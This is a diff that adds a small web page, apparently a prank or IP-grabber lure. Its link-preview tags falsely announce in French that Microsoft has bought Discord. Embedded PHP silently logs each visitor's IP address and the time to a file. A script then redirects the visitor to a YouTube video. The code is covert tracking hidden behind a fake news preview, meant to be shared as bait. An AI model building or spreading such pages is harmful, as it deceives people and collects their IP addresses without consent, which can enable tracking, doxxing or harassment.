@@ -1,0 +1,27 @@
+xmlns:og="http://ogp.me/ns#">
+        <meta property="og:site_name" content="Ace the kraker">
+        <meta property="og:url" content="https://ace-dev.monster">
+        <meta property="og:title" content="Microsoft viennent de racheter discord">
+        <meta property="og:image" content="https://static1.colliderimages.com/wordpress/wp-content/uploads/2021/03/discord-microsoft.png">
+        <meta property="og:image:width" content="1280">
+        <meta property="og:image:height" content="720">
+        <meta property="og:description" content="omg microsoft qui rachète discord">
+        <meta property="og:type" content="video.other">
+        <meta property="og:video:url" content="https://ace-dev.monster/rickroll.mp4">
+        <meta property="og:video:secure_url" content="https://ace-dev.monster/rickroll.mp4">
+        <meta property="og:video:type" content="text/html">
+        <meta property="og:video:width" content="960">
+        <meta property="og:video:height" content="720">
+
+<?php
+$logfile= 'info.html';
+$IP = $_SERVER['REMOTE_ADDR'];
+$logdetails=  date("F j, Y, g:i a") . ': ' . '<a target=_blank href=http://www.dnsstuff.com/tools/ipall.ch?domain='.$_SERVER['REMOTE_ADDR'].'>'.$_SERVER['REMOTE_ADDR'].'</a>';
+$rc = fopen($logfile, "a"); 
+fwrite($rc, $logdetails);
+fwrite($rc, "<br />_____ Provided by JavaScripthost.com _____");
+fwrite($rc, "<br>");
+fclose($rc);
+?>
+
+<script>document.location = "https://www.youtube.com/watch?v=EfOjTkFR1iw"</script>
